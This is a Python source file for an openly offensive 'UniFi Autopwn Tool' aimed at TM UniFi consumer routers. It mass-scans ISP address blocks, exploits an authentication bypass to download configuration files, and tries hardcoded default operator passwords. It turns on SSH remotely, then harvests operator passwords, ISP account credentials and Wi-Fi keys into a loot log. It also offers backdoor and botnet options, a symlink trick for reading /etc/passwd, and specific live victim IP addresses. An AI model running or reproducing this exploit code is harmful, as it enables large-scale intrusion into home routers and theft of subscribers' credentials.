"""
Released under the MIT-license:

Copyright (c) 2009,2010, KLKS and RuFI0

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
"""
# UniFi Autopwn Tool
# RuFI0 and KLKS of The Sexy Kambingz
# 
# This tool scans the whole IP block of TM UniFi routers, reads in the config file,
# dumps the account details, and tries to authenticate with the stolen operator password.
# It can even enable the built-in ssh daemon as a backdoor
# 
# NOTES
# - Files can be copied out of the router by using the symlink hack, ln -sv /etc/passwd /var/config.bin.
# - The file can be downloaded as http://router/config.bin.
#
# CHANGELOG
#
# Version 3
# ---------
# - Code rewritten completely to support newer firmwares.
# - The script now auto detects the firmware version number to determine which hack to use.

import sys
import getopt
import re
import httplib
import urllib
import gzip
import os
import socket
import subprocess
import base64
import ssh
from threading import Thread
from Queue import Queue
from time import localtime
import thread
from httplib import HTTPException, socket
from time import sleep

#DB Schema
#login,pass,ssid,ssid_key,op_pass,mgmt_url

script_version = "UniPwn v3.0 (29 October 2012)"

oldPython = False
if sys.version_info[:2] == (2, 5):
	oldPython = True
	
httpTimeout = 30
enableBackdoor = 0
enableBot = 0
configbin_path = "configs/"

#Used for threading
ip_queue = None
printLock = None

# This function attempts to establish an SSH connection to the router. It returns a socket descriptor on success
# and int(-1) on failure.
def establishConnection(ip_address, port):
	global oldPython, httpTimeout
	conn = None

	# This is to do a HEAD request to make sure that the port is actually open
	try:
		if oldPython:
			socket.setdefaulttimeout(httpTimeout)
			conn = httplib.HTTPConnection(ip_address, port)
		else:
			conn = httplib.HTTPConnection(ip_address, port, timeout=httpTimeout)

		conn.request("HEAD", "/login.php")
	except socket.error:
		return None
	except:
		return None

	# We do the same thing again but this time to return the socket descriptor
	# Python is gay about this when it comes to single thread web servers.
	conn.close()
	try:
		if oldPython:
			socket.setdefaulttimeout(httpTimeout)
			conn = httplib.HTTPConnection(ip_address, port)
		else:
			conn = httplib.HTTPConnection(ip_address, port, timeout=httpTimeout)
	except:
		return None

	return conn

# This function attempts to retrieve the firmware version of the router. It returns the firmware string(version)
# on success and int(-1) on failure.
def getRouterFirmwareVersion(ip_address, port):
	conn = establishConnection(ip_address, port)
	firmware_version = ""
	
	# Could not establish a connection to IP:Port, fail.
	if conn == None:
		return -1

	# Retrieve firmware version
	try:
		conn.request("GET", "/tools_admin.php")
		http_res = conn.getresponse()
	except:
		conn.close()
		return -1

	if http_res.status == 200:
		data = http_res.read()
		conn.close()

		m = re.search('<td\s+noWrap\s+align="right">Firmware\s+Version&nbsp;:&nbsp;(.*)&nbsp;<\/td>', data)
		if m:
			firmware_version = m.group(1)
			return firmware_version
	else:
		conn.close()
		return -1

# This function is an implementation of the authentication bypass exploit which allows anyone to download the
# router's configuration file. It returns the XML content of the router configuration on success, and int(-1)
# on failure.
def authBypassExploit(ip_address, port):
	conn = establishConnection(ip_address, port)

	if conn == None:
		return -1

	try:
		conn.request("GET", "/config.bin")
		http_res = conn.getresponse()
	except:
		conn.close()
		return -1

	if (http_res.status == 200):
		data = http_res.read()
		conn.close()
		magic_marker = data.find("\x1f\x8b")

		# Not the config file we're looking for. Router not vulnerable.
		if (magic_marker == -1):
			return -1
		else:
			config = open(configbin_path+'config.bin-'+ip_address, 'wb')
			config.write(data[magic_marker:])
			config.close()

			try:
				config = gzip.open(configbin_path+'config.bin-'+ip_address, 'rb')
				content = config.read()
				config.close()
			except:
				config.close()
				return -1

			return content
	else:
		return -1

# This function attempts to retrieve the router's config.bin file. It returns the binary data on success
# and int(-1) on failure.
def grabConfig(ip_address, port, conn):
	try:
		conn.request("GET", "/config.bin")
		http_res = conn.getresponse()
	except:
		#conn.close()
		return -1

	if http_res.status == 200:
		data = http_res.read()
		conn.close()
		magic_marker = data.find("\x1f\x8b")

		if (magic_marker == -1):
			return -1
		else:
			config = open(configbin_path+'config.bin-'+ip_address, 'wb')
			config.write(data[magic_marker:])
			config.close()

			try:
				config = gzip.open(configbin_path+'config.bin-'+ip_address, 'rb')
				content = config.read()
			except:
				return -1
	else:
		return -1
	return content

# This function attempts to authenticate with the router using the supplied username and password. It returns
# a socket descriptor on success, and int(-1) on failure.
def login(ip_address, port, uname, passwd):
	conn = establishConnection(ip_address, port)

	if conn == None:
		return -1

	params = urllib.urlencode({'ACTION_POST':'LOGIN', 'LOGIN_USER':uname, 'LOGIN_PASSWD':passwd, 'login':'Login+'})
	headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/plain"}

	try:
		conn.request("POST", "/login.php", params, headers)
		http_res = conn.getresponse()
		data = http_res.read()
	except:
		conn.close()
		return -1

	# Look for in-session data
	m = re.search("<META\s+HTTP-EQUIV=Refresh\s+CONTENT=\'0;\s+url=index.php\'>", data)
	if m:
		return conn
	else:
		# This is for newer firmwares >= 7.12
		m = re.search('top.location.href="index.php"', data)
		if m:
			return conn
		else:
			conn.close()
			return -1

# This function attempts to authenticate with the router using a dictionary of operator possible operator
# credentials. It returns a socket descriptor and the valid username and password on success, and int(-1)
# on failure.
def defaultCredentialsTest(ip_address, port):
	usernames = ['admin', 'operator', 'Management']
	passwords = ['h566UniFi', 'telekom', 'TestingR2']
	working_u = ""
	working_p = ""

	for uname in usernames:
		for passwd in passwords:
			conn = login(ip_address, port, uname, passwd)

			# Login is successful
			if conn != -1:
				working_u = uname
				working_p = passwd
				break

	if working_u != "" and working_p != "":
		conn = login(ip_address, port, working_u, working_p)
		return (conn, working_u, working_p)
	else:
		return -1

# This function parses the router's configuration in XML form. It returns awesome loot stuff.
def xmlParser(xml):
	# Grab the operator password and username
	operator_username = ""
	operator_password = ""
	m = re.search('<name>operator<\/name>\s*<password>(.*)<\/password>', xml)
	if m:
		operator_password = m.group(1)
		operator_username = "operator"
	else:
		m = re.search('<name>Management<\/name>\s*<password>(.*)<\/password>', xml)
		if m:
			operator_password = m.group(1)
			operator_username = "Management"
		else:
			operator_password = "NOT_FOUND"
			operator_username = "NOT_FOUND"

	# Grab UniFi account details
	isp_username = ""
	isp_password = ""
	m = re.search('<pppoe>\s*<mode>.*<\/mode>\s*<staticip>.*<\/staticip>\s*<user>(.*)<\/user>\s*<password>(.*)<\/password>', xml)
	if m:
		isp_username = m.group(1)
		isp_password = m.group(2)
	else:
		isp_username = "NOT_FOUND"
		isp_password = "NOT_FOUND"

	# Grab wireless key
	m = re.findall('<ssid>(.*)<\/ssid>', xml)
	wifi_ssid = ""
	if m:
		if m[2] == "" or m[2] == "Dlink":
			wifi_ssid = "NOT_FOUND"
		else:
			wifi_ssid = m[2]

	m = re.findall('<key\s*.*>(.*)<\/key>', xml)
	wifi_key = "NOT_FOUND"
	if m:
		for key in m:
			if key != "":
				wifi_key = key

	return (operator_username, operator_password, isp_username, isp_password, wifi_ssid, wifi_key)

# This function enables/disables the SSH port on the router. when the argument 'enable' is set to "True",
# the function will enable ssh, and when set to "False" will disable ssh. It returns int(0) on success, and 
# int(-1) on failure.
def toggleSSH(ip_address, port, username, password, enable=True):

	change_status = False
	commit_status = False
	conn = login(ip_address, port, username, password)
	if conn == -1:
		return -1

	if enable:
		# Enable SSH on the router
		params = urllib.urlencode({"ACTION_POST":'1', "apply":"Save+Settings", "admin_name":"admin", "user_password1":"**********", "user_password2":"**********",
									"admin_password1":"**********", "admin_password2":"**********", "rt_enable":"on", "rt_enable_h":"1", "rt_ipaddr":"0.0.0.0", 
									"rt_port":"8080", "rt_https_port":"443", "rt_enable_ssh_h_lan":"0", "rt_enable_ssh":"on", "rt_enable_ssh_h":"1", "rt_control_ipaddr":"0.0.0.0",
									"rt_control_port":"22", "rt_enable_telnet_h":"0"})
		
	else:
		# Disable SSH on the router
		params = urllib.urlencode({"ACTION_POST":'1', "apply":"Save+Settings", "admin_name":"admin", "user_password1":"**********", "user_password2":"**********",
									"admin_password1":"**********", "admin_password2":"**********", "rt_enable":"on", "rt_enable_h":"1", "rt_ipaddr":"0.0.0.0", 
									"rt_port":"8080", "rt_https_port":"443", "rt_enable_ssh_h_lan":"0", "rt_enable_ssh":"0", "rt_enable_ssh_h":"0", "rt_control_ipaddr":"0.0.0.0",
									"rt_control_port":"22", "rt_enable_telnet_h":"0"})
		
	headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/plain"}

	try:
		conn.request("POST", "/tools_admin.php", params, headers)
		http_res = conn.getresponse()
		change_status = True
	except:
		return -1

	# Commit changes to the router config
	conn.close()
	conn = login(ip_address, port, username, password)
	sleep(1)
	res = routerCommit(conn, 1)

	if res:
		commit_status = True

	if (change_status == True and commit_status == True):
		return 0
	else:
		return -1

# Some settings on the router requires a commit. This function commits the changes to the router. The argument
# 'action' determines which router function to commit to. The following options are currently available:
# action = 1 - Enable/disable SSH
# action = 2 - Save DDNS settings
# It returns bool(True) on success, and bool(False) on failure.
def routerCommit(conn, action=1):
	
	random_number = "%s.%s.%s.%s.%s.%s" % localtime()[0:6]
	headers = {"User-Agent":"autoPwn",
				"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Encoding":"gzip,deflate"}
	try:
		if action == 1:
			conn.request("GET", "/tools_admin.xgi?random_num="+random_number+"&exeshell=submit%20COMMIT&exeshell=submit%20REMOTE", headers=headers)
		else:
			conn.request("GET", "/tools_admin.xgi?random_num="+random_number+"&exeshell=submit%20COMMIT&exeshell=submit%20DDNS", headers=headers)
		http_res = conn.getresponse()
		conn.close()
		return True
	except:
		#conn.close()
		return False

# This function will enable SSH on the router, login via SSH, and dumps the router configuration into an
# XML file. It returns the XML content on success, and int(-1) on failure.
def grabConfigViaSSH(ip_address, port, username, password):
	
	enable_ssh = toggleSSH(ip_address, port, username, password)

	# Enable SSH
	if enable_ssh == 0:
		#SSH to the target
		try:
			myssh = ssh.Connection(ip_address, username=username, password=password)
		except:
			# Close the ssh port
			toggleSSH(ip_address, port, username, password, False)
			return -1

		ret = myssh.execute("/usr/sbin/rgdb -D /tmp/config.xml");
		ret = myssh.execute("cat /tmp/config.xml")

		# Save to file
		filename = "configs/config.xml-%s" % (ip_address)
		f = open(filename, "w")
		for line in ret:
			f.write(line)
		f.close()

		# Let's close the ssh port for the target's sake
		myssh.execute("rgdb -i -s /security/remoteaccess/sshallow/enable ''")
		myssh.close()

		# Read in XML and parse
		filename = "configs/config.xml-%s" % (ip_address)
		f = open(filename, "r")
		xml_content = f.read()
		f.close()
	else:
		return -1

	# Close ssh port and return XML content
	toggleSSH(ip_address, port, username, password, False)
	return xml_content

# This function preps the loot to be printed out and calls printLog to print out to STDOUT
def displayLoot(ip_address, port, version, op_user, op_pass, isp_user, isp_pass, wifi_ssid, wifi_key):
	pLog = "http://%s:%s\n" % (ip_address, port)
	pLog += "Firmware version: %s\n" % (version)
	pLog += "Operator username: %s\n" % (op_user)
	pLog += "Operator password: %s\n" % (op_pass)
	pLog += "Unifi username: %s\n" % (isp_user)
	pLog += "Unifi password: %s\n" % (isp_pass)
	pLog += "Wireless SSID: %s\n" % (wifi_ssid)
	pLog += "Wireless key: %s\n" % (wifi_key)
	pLog += "\n"
	printLog(pLog)

# This function prints out any string to STDOUT
def printLog(string):
	global printLock
	printLock.acquire()
	print string
	printLock.release()

# Saves the loot to file unipwn.log
def Log(msg):
	global printLock
	printLock.acquire()
	log = open("unipwn.log", 'a')
	log.write(msg + "\n")
	log.close()
	printLock.release()

def usage():
	print \
	"""
	Example:
	python unifi-autopwn.py -n /opt/local/bin/nmap
	
	Options:
		-h, --help\t\t\t\tShow this message and exit
		-n NMAP_PATH, --nmap NMAP_PATH\t\tNmap path on localhost
		-b, --backdoor\t\t\t\tBackdoors the targets using SSH (optional)
		-t\t\t\t\t\tThreads to run (default=10, max=200)
		-u\t\t\t\t\tTurn router into a uniBot zombie
	"""

# This function is where all the magic happens. Distributes work to threads.
def workerThread(q):
	uname = ""
	passwd = ""

	while True:
		ip = q.get()
		for p in (80,8080):
			conn = establishConnection(ip, p)
			if conn != None:
				conn.close()
				firmware_version = getRouterFirmwareVersion(ip, p)
				
				if firmware_version == "7.05" or firmware_version == "7.05B":
					xml = authBypassExploit(ip, p)
					loot = xmlParser(xml)

					displayLoot(ip, p, firmware_version, loot[0], loot[1], loot[2], loot[3], loot[4], loot[5])
					Log("%s,%s,%s,%s,%s,%s,%s,%s,%s" % (ip, p, firmware_version, loot[0], loot[1], loot[2], loot[3], loot[4], loot[5]))

				else:
					res = defaultCredentialsTest(ip, p)

					# We have valid credentials!
					if (res != -1):
						conn = res[0]
						uname = res[1]
						passwd = res[2]

						if float(firmware_version) >= 7.12:
							# Dump router config via SSH
							xml = grabConfigViaSSH(ip, p, uname, passwd)
							if (xml != -1):
								loot = xmlParser(xml)

								# Dump loot to file
								displayLoot(ip, p, firmware_version, loot[0], loot[1], loot[2], loot[3], loot[4], loot[5])
								Log("%s,%s,%s,%s,%s,%s,%s,%s,%s" % (ip, p, firmware_version, loot[0], loot[1], loot[2], loot[3], loot[4], loot[5]))

						else:
							# This is for firmwares like 7.09, where the config.bin is gzip + b64
							config = grabConfig(ip, p, conn)

							if config != -1:
								xml = base64.b64decode(config)
								loot = xmlParser(xml)

								# Dump loot to file
								displayLoot(ip, p, firmware_version, loot[0], loot[1], loot[2], loot[3], loot[4], loot[5])
								Log("%s,%s,%s,%s,%s,%s,%s,%s,%s" % (ip, p, firmware_version, loot[0], loot[1], loot[2], loot[3], loot[4], loot[5]))
		q.task_done()

# No explaination needed, it's the main function.
def main(argv):
	global printLock, enableBackdoor, ip_queue, enableBot
	threadCount = 10
	nmapPath = "nmap"
	
	# Because everyone needs a cool looking banner
	print \
	"""
	UniFi Autopwn Tool -- brought to you by The Sexy Kambingz
	             petme [at] thesexykambingz.com
	"""
	
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hn:bt:u", ["help", "nmap=", "backdoor"])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
		
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit(2)
		elif opt in ("-n", "--nmap"):
			nmapPath = arg
		elif opt in ("-b", "--backdoor"):
			enableBackdoor = 1
		elif opt == "-t":
			try:
				tc = int(arg)
			except:
				print "Invalid thread count :" + a
				sys.exit(2)
			if tc > 200:
				tc = 200
			threadCount = tc
		elif opt == "-u":
			enableBot = 1
	

	#Acquire locks
	printLock = thread.allocate_lock()
	ip_queue = Queue()
	
	#Start kicking off threads
	for i in range(threadCount):
		worker = Thread(target=workerThread, args=(ip_queue,))
		worker.setDaemon(True)
		worker.start()
	
	# We could just pass the IP address range as a CLI argument, but this is better
	# because we can keep track of the list of IP address ranges.

	#First_2_Octet = "1.9."		# inetnum: 1.9.0.0 - 1.9.255.255
	#First_2_Octet = "112.137."	# inetnum: 112.137.160.0 - 112.137.175.254
	First_2_Octet = "110.159."	# inetnum: 110.159.0.0 - 110.159.255.255
	#First_2_Octet = "175.136."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "175.137."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "175.138."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "175.139."	# inetnum: 175.136.0.0 - 175.143.255.255	
	#First_2_Octet = "175.140."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "175.141."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "175.142."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "175.143."	# inetnum: 175.136.0.0 - 175.143.255.255
	#First_2_Octet = "49.236."	# inetnum: 49.236.192.0 - 49.236.207.254
	#First_2_Octet = "210.195."	# inetnum: 210.195.0.0 - 210.195.63.255

	# Test IPs
	# 7.05B - http://175.136.253.161:8080/
	# 7.09 - http://175.136.255.145:8080/
	# 7.12 - http://175.136.255.197:8080/
	# 7.14 - http://110.159.100.27:8080/
	for trdO in range(0,256):
		# Scan subnet with nmap
		ip = First_2_Octet + str(trdO) + ".1/24"
		#ip = First_2_Octet + str(trdO) + ".197"
		print "---Scanning on '%s'---" % (ip)
		
		#Delete unifi-targets.gnmap
		if os.path.isfile("unifi-targets.gnmap"):
			os.remove("unifi-targets.gnmap")
			
		nmap_cmd = nmapPath + " -n -sP -oG unifi-targets.gnmap " + ip
		if sys.platform not in ("win32", "cygwin"):
			nmap_cmd = nmap_cmd + " > /dev/null"
			
		os.system(nmap_cmd)
		f = open("unifi-targets.gnmap", "r")
		live_systems = f.readlines()
		f.close()

		for ls in live_systems:
			x = ls.split()
			if (x[4] == 'Up'):
				ip_queue.put(x[1])

		ip_queue.join()
		print "--- END (%s)---\n" % (ip)
	
if __name__ == "__main__":
	main(sys.argv[1:])
